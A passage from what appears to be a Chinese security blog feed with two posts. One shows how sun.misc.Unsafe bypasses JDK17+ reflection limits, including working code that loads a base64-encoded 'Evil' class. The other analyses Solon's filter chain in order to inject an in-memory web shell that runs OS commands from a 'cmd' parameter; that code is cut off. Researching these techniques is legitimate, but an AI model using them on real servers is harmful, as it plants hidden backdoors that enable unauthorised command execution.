class="keyword">private</span> <span class="keyword">static</span> Unsafe <span class="title function_">reflectGetUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; name = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> name.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        log.error(e.getMessage(), e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">如下图所示，Unsafe提供的API大致可分为内存操作、CAS、Class相关、对象操作、线程调度、系统信息获取、内存屏障、数组操作等几类。</font></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729615985551-292f8d9f-9b1e-49b0-b6f1-87ea5aa0003a.png"></p><p><font style="color:#000000;">在Class相关部分主要提供Class和它的静态字段的操作相关方法，包含静态字段内存定位、定义类、定义匿名类、检验&amp;确保初始化等。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取给定静态字段的内存地址偏移量，这个值对于给定的字段是唯一且固定不变的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">// 获取一个静态类中给定字段的对象指针</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">// 判断是否需要初始化一个类，通常在获取一个类的静态属性的时候（因为一个类如果没初始化，它的静态属性也不会初始化）使用。 当且仅当ensureClassInitialized方法不生效时返回false。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">// 检测给定的类是否已经初始化。通常在获取一个类的静态属性的时候（因为一个类如果没初始化，它的静态属性也不会初始化）使用。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">// 定义一个类，此方法会跳过JVM的所有安全检查，默认情况下，ClassLoader（类加载器）和ProtectionDomain（保护域）实例来源于调用者</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len, ClassLoader loader, ProtectionDomain protectionDomain);</span><br><span class="line"><span class="comment">// 定义一个匿名类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; hostClass, <span class="type">byte</span>[] data, Object[] cpPatches);</span><br></pre></td></tr></table></figure><p>在对象操作部分主要包含对象成员属性相关操作及非常规的对象实例化方式等相关方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回对象成员属性在内存地址相对于此对象的内存地址的偏移量</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">objectFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">// 获得给定对象的指定地址偏移量的值，与此类似操作还有：getInt，getDouble，getLong，getChar等</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"><span class="comment">// 给定对象的指定地址偏移量设值，与此类似操作还有：putInt，putDouble，putLong，putChar等</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;</span><br><span class="line"><span class="comment">// 从对象的指定偏移量处获取变量的引用，使用volatile的加载语义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObjectVolatile</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"><span class="comment">// 存储变量的引用到对象的指定的偏移量处，使用volatile的存储语义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObjectVolatile</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;</span><br><span class="line"><span class="comment">// 有序、延迟版本的putObjectVolatile方法，不保证值的改变被其他线程立即看到。只有在field被volatile修饰符修饰时有效</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putOrderedObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;</span><br><span class="line"><span class="comment">// 绕过构造方法、初始化代码来创建对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">allocateInstance</span><span class="params">(Class&lt;?&gt; cls)</span> <span class="keyword">throws</span> InstantiationException;</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p><font style="color:#000000;">在上文提到了</font><strong><font style="color:#000000;">sun.misc和sun.reflect包可供所有JDK版本（包括JDK17）中的工具和库进行反射</font></strong><font style="color:#000000;">，而在sun.misc包下就有着Unsafe类。那么该如何利用Unsafe来打破JDK17及以上的强封装module限制呢？</font></p><p><font style="color:#000000;">在Java中，setAccessible是一个用于改变Java反射时对私有属性或方法访问限制的方法。它是java.lang.reflect.AccessibleObject类的一个方法，该类是Field、Method和Constructor等类的超类。setAccessible(true)方法允许绕过Java的访问控制检查，从而访问私有（private）或受保护（protected）的属性和方法。</font></p><p>跟进<font style="color:#000000;">setAccessible方法，首先调用AccessibleObject类的静态方法checkPermission，该方法检查当前的安全策略是否允许改变访问控制；如果不允许，会抛出SecurityException。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span> &#123;</span><br><span class="line">    AccessibleObject.checkPermission();</span><br><span class="line">    <span class="keyword">if</span> (flag) checkCanSetAccessible(Reflection.getCallerClass());</span><br><span class="line">    setAccessible0(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkPermission</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;removal&quot;)</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// SecurityConstants.ACCESS_PERMISSION is used to check</span></span><br><span class="line">        <span class="comment">// whether a client has sufficient privilege to defeat Java</span></span><br><span class="line">        <span class="comment">// language access control checks.</span></span><br><span class="line">        sm.checkPermission(SecurityConstants.ACCESS_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">接着，当设置非公共字段或方法的访问权限为true时，会调用checkCanSetAccessible方法，这个方法检查调用setAccessible方法的类是否有权限改变访问控制。Reflection.getCallerClass()方法获取调用setAccessible方法的类，不包括匿名内部类。</font></p><p><font style="color:#000000;">跟进java.lang.reflect.AccessibleObject#checkCanSetAccessible方法，可以看到，callerModule获取调用者的模块，declaringModule获取声明成员（方法或字段）的类的模块，如果调用者的模块与声明成员的类的模块相同，或者调用者是未知模块（Object.class.getModule()通常返回null），则允许访问。</font></p><p><font style="color:#000000;">因此，可以尝试利用Unsafe类来修改当前类的module属性和java.*下类的module属性一致来进行绕过。</font></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729660875570-3cc19ba3-05ee-42d8-adb6-f540b38d6c25.png"></p><p><font style="color:#000000;">在Unsafe类中，存在方法getAndSetObject，该方法是一个用于原子操作的方法，它主要用于在多线程环境下对对象的字段进行安全的更新操作，类似于反射赋值，可以利用其修改调用类的module。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">getAndSetObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object newValue)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> theInternalUnsafe.getAndSetReference(o, offset, newValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用Unsafe绕过JDK17+反射限制代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Java Version: &quot;</span> + System.getProperty(<span class="string">&quot;java.version&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Module</span> <span class="variable">module</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">        Class&lt;Main&gt; mainClass = Main.class;</span><br><span class="line">        <span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(mainClass, offset, <span class="keyword">module</span>);</span><br><span class="line"><span class="comment">//        unsafe.putObject(mainClass, offset, module);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClassBase64</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAAD0AIgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEAEm9wZW4gLWEgQ2FsY3VsYXRvcgoACAAQDAARABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAUAQATamF2YS9pby9JT0V4Y2VwdGlvbgcAFgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uCgAVABgMAAUAGQEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgcAGwEABEV2aWwBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQAhABoAAgAAAAAAAgABAAUABgABABwAAAAhAAEAAQAAAAUqtwABsQAAAAEAHQAAAAoAAgAAAAQABAAGAAgAHgAGAAEAHAAAAFQAAwABAAAAF7gABxINtgAPV6cADUu7ABVZKrcAF7+xAAEAAAAJAAwAEwACAB0AAAAWAAUAAAAKAAkADQAMAAsADQAMABYADgAfAAAABwACTAcAEwkAAQAgAAAAAgAh&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(evilClassBase64);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ((Class)method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, bytes, <span class="number">0</span>, bytes.length)).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729665004453-6b718c9a-62b0-4676-98cb-74ef4ff36c9c.png"></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729664566379-f275d344-d853-43de-a523-b4b60b57412b.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html">Migrating From JDK 8 to Later JDK Releases</a></p><p><a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">Java魔法类：Unsafe应用解析</a></p><p><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87">JDK17+反射限制绕过</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solon框架内存马</title>
      <link href="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><font style="color:#000000;">Solon是一个</font><strong><font style="color:#000000;">高性能的Java应用开发框架</font></strong><font style="color:#000000;">，它具有轻量级、易于使用、高性能和可扩展等特点。</font></p><p><font style="color:#000000;">Solon框架适用于Web、定时任务、远程调用、微服务等多种开发场景，它的设计理念是简单、轻量、易于扩展，并且对开发者友好。Solon的核心模块提供了基础的IOC容器和AOP功能，同时提供了Web模块、数据库模块和其他常用功能模块，以支持更多样化的功能需求。</font></p><p><font style="color:#000000;">Solon架构图如下所示。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729512385439-33bf9cfe-9dd6-4413-981e-c10ffec12fcb.png"></p><p><font style="color:#000000;">Solon框架的请求处理过程涉及几个关键的组件：</font><strong><font style="color:#000000;">过滤器（Filter）</font></strong><font style="color:#000000;">、</font><strong><font style="color:#000000;">路由拦截器（RouterInterceptor）</font></strong><font style="color:#000000;">、</font><strong><font style="color:#000000;">处理器（Handler）</font></strong><font style="color:#000000;">等。以下是Solon处理一个HTTP请求的大致流程：</font></p><ul><li><font style="color:#000000;">启动Solon应用：通过Solon.start(source, args, builder)启动Solon应用，这会实例化Solon.global()并加载配置，扫描插件并排序，运行初始化函数，推送事件，运行插件，导入Java Bean，扫描并加载Java Bean等步骤。</font></li><li><font style="color:#000000;">请求到达：当一个HTTP请求到达Solon应用时，首先会经过过滤器（Filter）。过滤器是全局的，对所有请求都起作用。开发者可以自定义过滤器来实现诸如日志记录、权限检查等功能。</font></li><li><font style="color:#000000;">路由拦截：经过过滤器后，请求会进入路由拦截器（RouterInterceptor）。在这里可以进行路由相关的处理，例如请求的重定向、路由的匹配等。</font></li><li><font style="color:#000000;">处理器处理：路由拦截器之后，请求会交给相应的处理器（Handler）进行处理。在Solon中，处理器可以是注解了@Controller的控制器中的方法，也可以是手动通过app.get、app.post等方法注册的处理器。</font></li><li><font style="color:#000000;">执行控制器方法：如果请求被映射到一个控制器方法，Solon会处理方法上的注解，如@Mapping，并注入参数，然后执行控制器方法。</font></li><li><font style="color:#000000;">返回响应：处理器处理完请求后，会返回一个响应给客户端。这个响应可能是一个字符串、一个模型对象、一个ModelAndView对象等。</font></li><li><font style="color:#000000;">视图渲染：如果处理器返回的是ModelAndView对象，Solon会使用配置的视图引擎（如Freemarker、Thymeleaf等）进行视图渲染，并将最终的HTML发送给客户端。</font></li><li><font style="color:#000000;">异常处理：如果在请求处理过程中发生异常，Solon还提供了异常处理器来统一处理这些异常。</font></li><li><font style="color:#000000;">插件扩展：Solon的插件体系允许开发者在不同的阶段插入自定义的处理逻辑，例如在请求处理前后、Bean加载、插件加载等阶段。</font></li></ul><p><font style="color:#000000;">Solon请求处理过程示意图如下所示，Web处理会经过四个路段：过滤器(Filter) -&gt; 路由拦截器(RouterInterceptor) -&gt; 处理器(Handler) -&gt; 拦截器(Interceptor)。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729512675020-1fc78b9f-eb5b-4b83-9570-914609694f24.png"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用官网给出的项目模板搭建即可，<a href="https://solon.noear.org/article/learn-quickstart">https://solon.noear.org/article/learn-quickstart</a>。</p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729565939651-326765b3-bae2-4260-a953-9b8b3e6b1ca3.png"></p><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p><font style="color:#000000;">编写一个Filter过滤器，在hello路由处下断点进行调试。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component(index = 0)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(Context ctx, FilterChain chain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(ctx.path());</span><br><span class="line">        chain.doFilter(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">可以看到，最先调用doFilter方法的位置在org.noear.solon.core.ChainManager#doFilter，</font><strong><font style="color:#000000;">此处的作用是构造filterchain</font></strong><font style="color:#000000;">，在filterNodes中存储着需要执行的Filter。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729584625931-ad40b7ef-daa9-4e4b-ae30-f67398f9c823.png"></p><p>继续往上跟进堆栈，在org.noear.solon.SolonApp#tryHandle中调用了<font style="color:#000000;">org.noear.solon.core.ChainManager#doFilter，同时该类继承了</font><font style="color:#080808;background-color:#ffffff;">org.noear.solon.core.route.RouterWrapper。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729584986539-26885c9e-b257-49d3-ab9e-ba5f3c69e7ca.png"></p><p><font style="color:#000000;">跟进</font><font style="color:#000000;background-color:#ffffff;">org.noear.solon.core.route.RouterWrapper，在初始化路由的时候，会对ChainManager进行初始化，通过调用addFilter方法来添加Filter，因此可以</font><strong><font style="color:#000000;background-color:#ffffff;">通过获取上下文中的_chainManager字段，来添加恶意的Filter</font></strong><font style="color:#000000;background-color:#ffffff;">。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729585231716-3a80c65c-b5ea-46a8-9732-5201ad20c7c4.png"></p><p>借助c0ny1师傅的Java内存对象搜索辅助工具java-object-searcher来搜索获取到_chainManager字段的链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 搜索_chainManager</span></span><br><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;_chainManager&quot;</span>).build());</span><br><span class="line"><span class="comment">// 新建一个广度优先搜索Thread.currentThread()的搜索器</span></span><br><span class="line"><span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(), keys);</span><br><span class="line"><span class="comment">// 打开调试模式, 会生成log日志</span></span><br><span class="line">searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 挖掘深度为20</span></span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line"><span class="comment">// 设置报告保存位置</span></span><br><span class="line">searcher.setReport_save_path(<span class="string">&quot;/Users/alphag0/Desktop&quot;</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure><p>搜索结果中一条符合的构造链如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;java.lang.Thread&#125; </span><br><span class="line">   ---&gt; threadLocals = &#123;java.lang.ThreadLocal$ThreadLocalMap&#125; </span><br><span class="line">    ---&gt; table = &#123;class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;&#125; </span><br><span class="line">     ---&gt; [<span class="number">10</span>] = &#123;java.lang.ThreadLocal$ThreadLocalMap$Entry&#125; </span><br><span class="line">      ---&gt; value = &#123;org.noear.solon.boot.smarthttp.http.SmHttpContext&#125; </span><br><span class="line">       ---&gt; _request = &#123;org.smartboot.http.server.impl.HttpRequestImpl&#125; </span><br><span class="line">        ---&gt; request = &#123;org.smartboot.http.server.impl.Request&#125; </span><br><span class="line">          ---&gt; serverHandler = &#123;org.noear.solon.boot.smarthttp.http.SmHttpContextHandler&#125; </span><br><span class="line">           ---&gt; handler = &#123;org.noear.solon.boot.smarthttp.XPluginImp$$Lambda$<span class="number">91</span>/<span class="number">1550228904</span>&#125; </span><br><span class="line">            ---&gt; arg$<span class="number">1</span> = &#123;org.noear.solon.SolonApp&#125; </span><br><span class="line">              ---&gt; _chainManager = &#123;org.noear.solon.core.ChainManager&#125;</span><br></pre></td></tr></table></figure><p>对于获取请求上下文，可以参考官方文档中的<a href="https://solon.noear.org/article/216">认识请求上下文</a>，利用Context ctx &#x3D; Context.current();来直接获取当前上下文。</p><p>Filter内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-filter&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> (ctx, chain) -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title 